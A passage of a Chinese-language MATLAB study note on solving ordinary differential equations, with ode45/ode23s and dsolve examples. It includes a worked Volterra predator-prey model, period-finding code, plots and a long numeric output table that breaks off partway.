class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">dy=@(t,y)[y(<span class="hljs-number">2</span>);y(<span class="hljs-number">3</span>);<span class="hljs-number">3</span>*y(<span class="hljs-number">3</span>)+y(<span class="hljs-number">2</span>)*y(<span class="hljs-number">1</span>)];<br>[T,Y]=ode23s(@(t,y)dy(t,y),[<span class="hljs-number">0</span> <span class="hljs-number">1</span>],[<span class="hljs-number">0</span>;<span class="hljs-number">1</span>;<span class="hljs-number">-1</span>]);<span class="hljs-comment">%函数传参一定要声明句柄,参数前后都要写</span><br></code></pre></td></tr></table></figure><h1 id="解常微分方程符号解"><a href="#解常微分方程符号解" class="headerlink" title="解常微分方程符号解"></a>解常微分方程符号解</h1><p>常微分方程在 Matlab 中按如下规定重新表达： 符号 D 表示对变量的求导。Dy 表示对变量 y 求一阶导数，当需要求变量的 n 阶导 数时，用 Dn 表示，D4y 表示对变量 y 求 4 阶导数。由此，常微分方程 $y’’+2y’= y$ 在 Matlab 中，将写成<br><img src="https://cdn.nlark.com/yuque/__latex/e3846e1a1ba906317bc14d1841dbe08b.svg#card=math&code=D2y%2B2%2ADy%3Dy&height=18&width=128"></p><h2 id="求解常微分方程的通解"><a href="#求解常微分方程的通解" class="headerlink" title="求解常微分方程的通解"></a>求解常微分方程的通解</h2><p>无初边值条件的常微分方程的解就是该方程的通解。<br><code>dsolve(&#39; diff_equation&#39;，&#39;var&#39;)</code><br>式中 diff_equation 为待解的常微分方程，第 1 种格式将以变量 t 为自变量进行求解， 第 2 种格式则需定义自变量 var。<br>栗子:<br>解<img src="https://cdn.nlark.com/yuque/__latex/80ea40cf4ace3937d7e295680fe5eac1.svg#card=math&code=x%5E2%2By%2B%28x-2y%29y%27%3D0&height=23&width=171"><br>程序如下:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">syms x y<br>diff_equ=<span class="hljs-string">&#x27;x^2+y+(x-2*y)*Dy=0&#x27;</span>;<span class="hljs-comment">%字符串形式的变量!注意!</span><br>dsolve(diff_equ,<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment">%ans =</span><br><span class="hljs-comment">% x/2 + ((4*x^3)/3 + x^2 + C4)^(1/2)/2</span><br><span class="hljs-comment">% x/2 - ((4*x^3)/3 + x^2 + C4)^(1/2)/2</span><br></code></pre></td></tr></table></figure><h2 id="求解常微分方程的初边值问题"><a href="#求解常微分方程的初边值问题" class="headerlink" title="求解常微分方程的初边值问题"></a>求解常微分方程的初边值问题</h2><p><code>dsolve(&#39;diff_equation&#39;，&#39;condition1，condition2，…&#39;，&#39;var&#39;)</code>其中 condition1，condition2，… 即为微分方程的初边值条件。<br>例如<code>y=dsolve(&#39;D3y-D2y=x&#39;,&#39;y(1)=8,Dy(1)=7,D2y(2)=4&#39;,&#39;x&#39;)</code><br>结果为</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">y =<br>x*((<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">19</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">14</span>))/<span class="hljs-number">2</span> - <span class="hljs-number">1</span>) + <span class="hljs-number">7</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>)*<span class="hljs-built_in">exp</span>(x) - x^<span class="hljs-number">2</span>/<span class="hljs-number">2</span> - x^<span class="hljs-number">3</span>/<span class="hljs-number">6</span> + (<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">19</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">14</span>))/<span class="hljs-number">2</span> - (<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">25</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">21</span>))/<span class="hljs-number">3</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="求解常微分方程组"><a href="#求解常微分方程组" class="headerlink" title="求解常微分方程组"></a>求解常微分方程组</h2><p><code> ``dsolve``(``&#39;diff_equ1，diff_equ2，…&#39;``，``&#39;``var``&#39;``)``%用于求通解</code><br><code> ``dsolve``(``&#39;diff_equ1，diff_equ2，…&#39;``，``&#39;``condition1，condition2，…``&#39;``，``&#39;``var``&#39;``)``%用于求初始值</code><br>例如,求<br><img src="https://cdn.nlark.com/yuque/__latex/7bd2e55827143b8dfe4babf3672f357d.svg#card=math&code=%5Cleft%5C%7B%0A%20%20%20%20%5Cbegin%7Barray%7D%7Brcl%7D%0A%20%20%20%20f%27%27%2B3g%3Dsinx%5C%5C%0A%20%20%20%20f%27%2Bg%27%3Dcosx%0A%20%20%20%20%20%20%20%0A%20%20%20%20%5Cend%7Barray%7D%0A%20%20%20%0A%5Cright.&height=45&width=128"></p><p>这个方程组的通解和在初始值为的解.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab">equ1=<span class="hljs-string">&#x27;D2f+3*g=sin(x)&#x27;</span>;<br>equ2=<span class="hljs-string">&#x27;Dg+Df=cos(x)&#x27;</span>;<br>[general_f,general_g]=dsolve(equ1,equ2,<span class="hljs-string">&#x27;x&#x27;</span>)<br>[f,g]=dsolve(equ1,equ2,<span class="hljs-string">&#x27;Df(2)=0,f(3)=3,g(5)=1&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br></code></pre></td></tr></table></figure><p>目前没有覆盖到多变量的常微分方程数值解,也不知道ode45传初始值的矩阵究竟用列向量还是行向量(似乎都可以,无论逗号或是分号)</p><h1 id="实战学习"><a href="#实战学习" class="headerlink" title="实战学习"></a>实战学习</h1><h2 id="双变量初始值下的常微分方程组"><a href="#双变量初始值下的常微分方程组" class="headerlink" title="双变量初始值下的常微分方程组"></a>双变量初始值下的常微分方程组</h2><h3 id="伏尔泰拉-Volterra-弱肉强食模型"><a href="#伏尔泰拉-Volterra-弱肉强食模型" class="headerlink" title="伏尔泰拉(Volterra)弱肉强食模型"></a>伏尔泰拉(Volterra)弱肉强食模型</h3><h4 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728726404-fc2fec55-a0b1-4880-acf1-80ee103ea848.png#align=left&display=inline&height=408&originHeight=408&originWidth=1203&size=0&status=done&style=none&width=1203"><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724276-0bf991f4-1f2a-478e-9d87-66c9c3db09c6.png#align=left&display=inline&height=551&originHeight=551&originWidth=1210&size=0&status=done&style=none&width=1210"></p><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>即初值问题</p><p>其中,</p><ul><li><p>r是食饵独立生存的时候自然增长率</p></li><li><p>a 是由于捕食者存在导致减少的比例系数</p></li><li><p>c是捕食者独自存在时候的死亡率</p></li><li><p>b是由于食饵存在导致死亡率减少的比例系数</p></li></ul><blockquote><p>它们均大于0.</p></blockquote><p>注意多变量的矩阵变换<br>或许必须将x’,y’放在方程组的一边用于迭代<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724467-e6a74b08-80d7-4b5f-b1d7-efe62749c16c.png#align=left&display=inline&height=1000&originHeight=1000&originWidth=1743&size=0&status=done&style=none&width=1743"><br>但是如果x’与y’是乘的关系呢?<br>似乎不用考虑,因为高数里面也没有涉及到<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dd</span> = <span class="hljs-title">shier</span><span class="hljs-params">(t,x)</span></span><br>r = <span class="hljs-number">1</span>;<br>c =<span class="hljs-number">0.5</span>;<br>a = <span class="hljs-number">0.1</span>;<br>b = <span class="hljs-number">0.02</span>;<br>dd = <span class="hljs-built_in">diag</span>([r-a*x(<span class="hljs-number">2</span>,:),-c+b*x(<span class="hljs-number">1</span>,:)])*x;<span class="hljs-comment">%把原来的x,y放在一个矩阵里就可以只用一个符号变量进行索引</span><br><span class="hljs-comment">%对于左边是x&#x27;的,就把x初始值乘进去,然后索引y的初始值,其实如果反过来索引也可以</span><br>dd返回的是[x&#x27;,y&#x27;]&#x27;,然后交给ode45处理<br></code></pre></td></tr></table></figure><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs matlab">tspan = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">15</span>;<br>[t,x] = ode45(@shier,tspan,[<span class="hljs-number">25</span>;<span class="hljs-number">2</span>]);<span class="hljs-comment">%我认为t只是传进来迭代次数,与常微分方程组本身并无关系</span><br><span class="hljs-built_in">plot</span>(t,x);<br></code></pre></td></tr></table></figure><p>结果<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724315-a135b910-e3a4-4487-a404-4929cb8f7b99.png#align=left&display=inline&height=484&originHeight=484&originWidth=631&size=0&status=done&style=none&width=631"><br>这里甚至可以看出图像具有周期性,那么怎么计算出周期呢?</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs matlab">tspan = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">15</span>;<br>[t,x] = ode45(@shier,tspan,[<span class="hljs-number">25</span>;<span class="hljs-number">2</span>]);<span class="hljs-comment">%我认为t只是传进来迭代次数,与常微分方程组本身并无关系</span><br><span class="hljs-comment">%方法一</span><br><span class="hljs-comment">%a = find((abs(x(1,1)-x(1:length(x),1)))&lt;1);%如果是min的话他只会索引到第一个原值</span><br>这里<br><span class="hljs-comment">%方法二</span><br>a = <span class="hljs-built_in">find</span>(x(:,<span class="hljs-number">1</span>)==(x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)-<span class="hljs-built_in">min</span>(<span class="hljs-built_in">abs</span>((x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)-x(<span class="hljs-number">2</span>:<span class="hljs-built_in">length</span>(x),<span class="hljs-number">1</span>))))));<span class="hljs-comment">%这里不是加就是减,一定会索引到最小值的,多试两遍就出来了</span><br><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">1</span>)<br><span class="hljs-comment">%plot(t,x,t(a(2,1),1),x(a(2,1),1),&#x27;*&#x27;);%方法一对应的找数据点方法</span><br><span class="hljs-built_in">plot</span>(t,x,t(a,<span class="hljs-number">1</span>),x(a,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;*&#x27;</span>);<span class="hljs-comment">%方法二对应的找数据点的方法</span><br><span class="hljs-built_in">hold</span> on;<br>line([<span class="hljs-number">0</span> <span class="hljs-number">15</span>],[x(a,<span class="hljs-number">1</span>) x(a,<span class="hljs-number">1</span>)],<span class="hljs-string">&#x27;LineStyle&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>);<span class="hljs-comment">%画一条水平线</span><br>line([t(a,<span class="hljs-number">1</span>) t(a,<span class="hljs-number">1</span>)],[<span class="hljs-number">0</span> x(a,<span class="hljs-number">1</span>)],<span class="hljs-string">&#x27;LineStyle&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>);<span class="hljs-comment">%画一条竖直线</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">plot</span>(x(:,<span class="hljs-number">1</span>),x(:,<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>效果图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724307-1371059e-f603-4d15-bc14-6a665012a47a.png#align=left&display=inline&height=478&originHeight=478&originWidth=627&size=0&status=done&style=none&width=627"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724185-c1c8c0b1-d3a6-4f16-9857-709d2384eaad.png#align=left&display=inline&height=481&originHeight=481&originWidth=610&size=0&status=done&style=none&width=610"><br>其中dd参数在传入初始值[25;2]后运算结果(即t=0.1时)</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span> =<br><br> <span class="hljs-number">25</span>*r - <span class="hljs-number">25</span>*a*y<br> <span class="hljs-number">2</span>*b*x - <span class="hljs-number">2</span>*c<br> <span class="hljs-comment">%这是一个列向量,有两行,其中y为2,x为25,这里只是为了便于理解</span><br></code></pre></td></tr></table></figure><pre><code>  而结果最终返回的x是一个n*2的矩阵,第一列是x,第二列是y</code></pre><p>结果的数值表示为</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span> =<br><br>                   <span class="hljs-number">0</span>  <span class="hljs-number">25.000000000000000</span>   <span class="hljs-number">2.000000000000000</span><br>   <span class="hljs-number">0.100000000000000</span>  <span class="hljs-number">27.081808053754724</span>   <span class="hljs-number">2.004112695948303</span><br>   <span class="hljs-number">0.200000000000000</span>  <span class="hljs-number">29.334409623386446</span>   <span class="hljs-number">2.016970388233990</span><br>   <span class="hljs-number">0.300000000000000</span>  <span class="hljs-number">31.768915238930827</span>   <span class="hljs-number">2.039429632085728</span><br>   <span class="hljs-number">0.400000000000000</span>  <span class="hljs-number">34.396069793378309</span>   <span class="hljs-number">2.072575255691516</span><br>   <span class="hljs-number">0.500000000000000</span>  <span class="hljs-number">37.225819482896881</span>   <span class="hljs-number">2.117788767225540</span><br>   <span class="hljs-number">0.600000000000000</span>  <span class="hljs-number">40.267311806832083</span>   <span class="hljs-number">2.176748354848179</span><br>   <span class="hljs-number">0.700000000000000</span>  <span class="hljs-number">43.501170756497132</span>   <span class="hljs-number">2.253434244955612</span><br>   <span class="hljs-number">0.800000000000000</span>  <span class="hljs-number">46.935996455891825</span>   <span class="hljs-number">2.350284334323296</span><br>   <span class="hljs-number">0.900000000000000</span>  <span class="hljs-number">50.607214111441841</span>   <span class="hljs-number">2.468336939929975</span><br>   <span class="hljs-number">1.000000000000000</span>  <span class="hljs-number">54.530132303795753</span>   <span class="hljs-number">2.610565196434151</span><br>   <span class="hljs-number">1.100000000000000</span>  <span class="hljs-number">58.699942987824969</span>   <span class="hljs-number">2.781877056174068</span><br>   <span class="hljs-number">1.200000000000000</span>  <span class="hljs-number">63.091721492623776</span>   <span class="hljs-number">2.989115289167727</span><br>   <span class="hljs-number">1.300000000000000</span>  <span class="hljs-number">67.660426521509294</span>   <span class="hljs-number">3.241057483112876</span><br>   <span class="hljs-number">1.400000000000000</span>  <span class="hljs-number">72.340900152021618</span>   <span class="hljs-number">3.548416043387018</span><br>   <span class="hljs-number">1.500000000000000</span>  <span class="hljs-number">77.047867835923512</span>   <span class="hljs-number">3.923838193047399</span><br>   <span class="hljs-number">1.600000000000000</span>  <span class="hljs-number">81.675938399200817</span>   <span class="hljs-number">4.381905972831026</span><br>   <span class="hljs-number">1.700000000000000</span>  <span class="hljs-number">86.099604042062211</span>   <span class="hljs-number">4.939136241154664</span><br>   <span class="hljs-number">1.800000000000000</span>  <span class="hljs-number">90.173240338938967</span>   <span class="hljs-number">5.613980674114787</span><br>   <span class="hljs-number">1.900000000000000</span>  <span class="hljs-number">93.731106238485580</span>   <span class="hljs-number">6.426825765487674</span><br>   <span class="hljs-number">2.000000000000000</span>  <span class="hljs-number">96.587344063579224</span>   <span class="hljs-number">7.399992826729324</span><br>   <span class="hljs-number">2.100000000000000</span>  <span class="hljs-number">98.535979511319994</span>   <span class="hljs-number">8.557737986975489</span><br>   <span class="hljs-number">2.200000000000000</span>  <span class="hljs-number">99.305464073021838</span>   <span class="hljs-number">9.923384989608529</span><br>   <span class="hljs-number">2.300000000000000</span>  <span class="hljs-number">98.614325538390403</span>  <span class="hljs-number">11.508508167056767</span><br>   <span class="hljs-number">2.400000000000000</span>  <span class="hljs-number">96.285088095021379</span>  <span class="hljs-number">13.306709884287148</span><br>   <span class="hljs-number">2.500000000000000</span>  <span class="hljs-number">92.247162361659704</span>  <span class="hljs-number">15.288207079976694</span><br>   <span class="hljs-number">2.600000000000000</span>  <span class="hljs-number">86.585268003842529</span>  <span class="hljs-number">17.394730789385640</span><br>   <span class="hljs-number">2.700000000000000</span>  <span class="hljs-number">79.534876888241484</span>  <span class="hljs-number">19.542682224883006</span><br>   <span class="hljs-number">2.800000000000000</span>  <span class="hljs-number">71.536355306602971</span>  <span class="hljs-number">21.622546215392298</span><br>   <span class="hljs-number">2.900000000000000</span>  <span class="hljs-number">63.084804160958107</span>  <span class="hljs-number">23.530018889724300</span><br>   <span class="hljs-number">3.000000000000000</span>  <span class="hljs-number">54.623560359426598</span>  <span class="hljs-number">25.181931216068016</span><br>   <span class="hljs-number">3.100000000000000</span>  <span class="hljs-number">46.544096804423660</span>  <span class="hljs-number">26.516262459375845</span><br>   <span class="hljs-number">3.200000000000000</span>  <span class="hljs-number">39.186022392660291</span>  <span class="hljs-number">27.492140181363510</span><br>   <span class="hljs-number">3.300000000000000</span>  <span class="hljs-number">32.793221206846198</span>  <span class="hljs-number">28.097843791494348</span><br>   <span class="hljs-number">3.400000000000000</span>  <span class="hljs-number">27.336823355775415</span>  <span class="hljs-number">28.376560995050070</span><br>   <span class="hljs-number">3.500000000000000</span>  <span class="hljs-number">22.737483650943837</span>  <span class="hljs-number">28.376423948829007</span><br>   <span class="hljs-number">3.600000000000000</span>  <span class="hljs-number">18.913395131038023</span>  <span class="hljs-number">28.142567798641700</span><br>   <span class="hljs-number">3.700000000000000</span>  <span class="hljs-number">15.777073834688206</span>  <span class="hljs-number">27.717805173699979</span><br>   <span class="hljs-number">3.800000000000000</span>  <span class="hljs-number">13.235358800468109</span>  <span class="hljs-number">27.142626186616940</span><br>   <span class="hljs-number">3.900000000000000</span>  <span class="hljs-number">11.187311576411814</span>  <span class="hljs-number">26.455624312391883</span><br>   <span class="hljs-number">4.000000000000000</span>   <span class="hljs-number">9.527792494902240</span>  <span class="hljs-number">25.691072088430193</span><br>   <span class="hljs-number">4.100000000000001</span>   <span class="hljs-number">8.175847419742645</span>  <span class="hljs-number">24.874012401250678</span><br>   <span class="hljs-number">4.200000000000000</span>   <span class="hljs-number">7.068391701914113</span>  <span class="hljs-number">24.024511571721689</span><br>   <span class="hljs-number">4.300000000000000</span>   <span class="hljs-number">6.159197028246341</span>  <span class="hljs-number">23.157992057962328</span><br>   <span class="hljs-number">4.400000000000000</span>   <span class="hljs-number">5.418516351184799</span>  <span class="hljs-number">22.285300010011660</span><br>   <span class="hljs-number">4.500000000000000</span>   <span class="hljs-number">4.812949938211244</span>  <span class="hljs-number">21.416178920107392</span><br>   <span class="hljs-number">4.600000000000001</span>   <span class="hljs-number">4.312378013540997</span>  <span class="hljs-number">20.558183397698095</span><br>   <span class="hljs-number">4.700000000000000</span>   <span class="hljs-number">3.896728033888424</span>  <span class="hljs-number">19.716433768708011</span><br>   <span class="hljs-number">4.800000000000001</span>   <span class="hljs-number">3.549963138651240</span>  <span class="hljs-number">18.894836312980246</span><br>   <span class="hljs-number">4.900000000000000</span>   <span class="hljs-number">3.260082149910534</span>  <span class="hljs-number">18.096083264276789</span><br>   <span class="hljs-number">5.000000000000000</span>   <span class="hljs-number">3.018079494247696</span>  <span class="hljs-number">17.321894302742177</span><br>   <span class="hljs-number">5.100000000000001</span>   <span class="hljs-number">2.815390957478957</span>  <span class="hljs-number">16.573545734604863</span><br>   <span class="hljs-number">5.200000000000000</span>   <span class="hljs-number">2.645975745866385</span>  <span class="hljs-number">15.851549329681150</span><br>   <span class="hljs-number">5.300000000000001</span>   <span class="hljs-number">2.504682806034744</span>  <span class="hljs-number">15.156183855662157</span><br>   <span class="hljs-number">5.400000000000000</span>   <span class="hljs-number">2.387154825623396</span>  <span class="hljs-number">14.487520111000972</span><br>   <span class="hljs-number">5.500000000000000</span>   <span class="hljs-number">2.289828233286297</span>  <span class="hljs-number">13.845420924912609</span><br>   <span class="hljs-number">5.600000000000001</span>   <span class="hljs-number">2.209933198691999</span>  <span class="hljs-number">13.229541157374021</span><br>   <span class="hljs-number">5.700000000000000</span>   <span class="hljs-number">2.145493632523649</span>  <span class="hljs-number">12.639327699124115</span><br>   <span class="hljs-number">5.800000000000001</span>   <span class="hljs-number">2.095302528876663</span>  <span class="hljs-number">12.074025260038512</span><br>   <span class="hljs-number">5.900000000000000</span>   <span class="hljs-number">2.057819970371494</span>  <span class="hljs-number">11.532952029583695</span><br>   <span class="hljs-number">6.000000000000000</span>   <span class="hljs-number">2.031734456202639</span>  <span class="hljs-number">11.015418711177421</span><br>   <span class="hljs-number">6.100000000000001</span>   <span class="hljs-number">2.016223775353870</span>  <span class="hljs-number">10.520656535937128</span><br>   <span class="hljs-number">6.200000000000000</span>   <span class="hljs-number">2.010602361556739</span>  <span class="hljs-number">10.047895063292874</span><br>   <span class="hljs-number">6.300000000000001</span>   <span class="hljs-number">2.014321293290578</span>   <span class="hljs-number">9.596362180987299</span><br>   <span class="hljs-number">6.400000000000000</span>   <span class="hljs-number">2.026968293782502</span>   <span class="hljs-number">9.165284105075676</span><br>   <span class="hljs-number">6.500000000000000</span>   <span class="hljs-number">2.048267731007400</span>   <span class="hljs-number">8.753885379925855</span><br>   <span class="hljs-number">6.600000000000001</span>   <span class="hljs-number">2.078080617687949</span>   <span class="hljs-number">8.361388878218298</span><br>   <span class="hljs-number">6.700000000000000</span>   <span class="hljs-number">2.116388457892334</span>   <span class="hljs-number">7.987017842929896</span><br>   <span class="hljs-number">6.800000000000001</span>   <span class="hljs-number">2.163225001305634</span>   <span class="hljs-number">7.630030231078177</span><br>   <span class="hljs-number">6.900000000000000</span>   <span class="hljs-number">2.218783549199125</span>   <span class="hljs-number">7.289725741835887</span><br>   <span class="hljs-number">7.000000000000000</span>   <span class="hljs-number">2.283347851980680</span>   <span class="hljs-number">6.965426060221426</span><br>   <span class="hljs-number">7.100000000000001</span>   <span class="hljs-number">2.357279290720927</span>   <span class="hljs-number">6.656474302505986</span><br>   <span class="hljs-number">7.200000000000000</span>   <span class="hljs-number">2.441016877153240</span>   <span class="hljs-number">6.362235016213561</span><br>   <span class="hljs-number">7.300000000000001</span>   <span class="hljs-number">2.535077253673752</span>   <span class="hljs-number">6.082094180120929</span><br>   <span class="hljs-number">7.400000000000000</span>   <span class="hljs-number">2.640054693341341</span>   <span class="hljs-number">5.815459204257671</span><br>   <span class="hljs-number">7.500000000000000</span>   <span class="hljs-number">2.756621099877643</span>   <span class="hljs-number">5.561758929906152</span><br>   <span class="hljs-number">7.600000000000000</span>   <span class="hljs-number">2.885526007667043</span>   <span class="hljs-number">5.320443629601537</span><br>   <span class="hljs-number">7.699999999999999</span>   <span class="hljs-number">3.027596581756677</span>   <span class="hljs-number">5.090985007131783</span><br>   <span class="hljs-number">7.800000000000000</span>   <span class="hljs-number">3.183737617856438</span>   <span class="hljs-number">4.872876197537634</span><br>   <span class="hljs-number">7.899999999999999</span>   <span class="hljs-number">3.354931542338962</span>   <span class="hljs-number">4.665631767112639</span><br>   <span class="hljs-number">8.000000000000000</span>   <span class="hljs-number">3.542377769952171</span>   <span class="hljs-number">4.468790794779848</span><br>   <span class="hljs-number">8.100000000000000</span>   <span class="hljs-number">3.747750865739365</span>   <span class="hljs-number">4.281929919898753</span><br>   <span class="hljs-number">8.199999999999999</span>   <span class="hljs-number">3.972287358592226</span>   <span class="hljs-number">4.104642734922401</span><br>   <span class="hljs-number">8.300000000000001</span>   <span class="hljs-number">4.217388158593900</span>   <span class="hljs-number">3.936541934626040</span><br>   <span class="hljs-number">8.399999999999999</span>   <span class="hljs-number">4.484692559397574</span>   <span class="hljs-number">3.777260394101559</span><br>   <span class="hljs-number">8.500000000000000</span>   <span class="hljs-number">4.776078238226527</span>   <span class="hljs-number">3.626451168757456</span><br>   <span class="hljs-number">8.600000000000000</span>   <span class="hljs-number">5.093661255874061</span>   <span class="hljs-number">3.483787494318877</span><br>   <span class="hljs-number">8.699999999999999</span>   <span class="hljs-number">5.439796056703555</span>   <span class="hljs-number">3.348962786827587</span><br>   <span class="hljs-number">8.800000000000001</span>   <span class="hljs-number">5.817075468648450</span>   <span class="hljs-number">3.221690642641979</span><br>   <span class="hljs-number">8.899999999999999</span>   <span class="hljs-number">6.228330703212222</span>   <span class="hljs-number">3.101704838437082</span><br>   <span class="hljs-number">9.000000000000000</span>   <span class="hljs-number">6.676631355468448</span>   <span class="hljs-number">2.988759331204541</span><br>   <span class="hljs-number">9.100000000000000</span>   <span class="hljs-number">7.165285404060722</span>   <span class="hljs-number">2.882628258252642</span><br>   <span class="hljs-number">9.199999999999999</span>   <span class="hljs-number">7.697839211202703</span>   <span class="hljs-number">2.783105937206295</span><br>   <span class="hljs-number">9.300000000000001</span>   <span class="hljs-number">8.278077522678160</span>   <span class="hljs-number">2.690006866007034</span><br>   <span class="hljs-number">9.399999999999999</span>   <span class="hljs-number">8.910023467840816</span>   <span class="hljs-number">2.603165722913034</span><br>   <span class="hljs-number">9.500000000000000</span>   <span class="hljs-number">9.597978929632328</span>   <span class="hljs-number">2.522479626174848</span><br>   <span class="hljs-number">9.600000000000000</span>  <span class="hljs-number">10.346846934533836</span>   <span class="hljs-number">2.447948500050266</span><br>   <span class="hljs-number">9.699999999999999</span>  <span class="hljs-number">11.162039893459859</span> 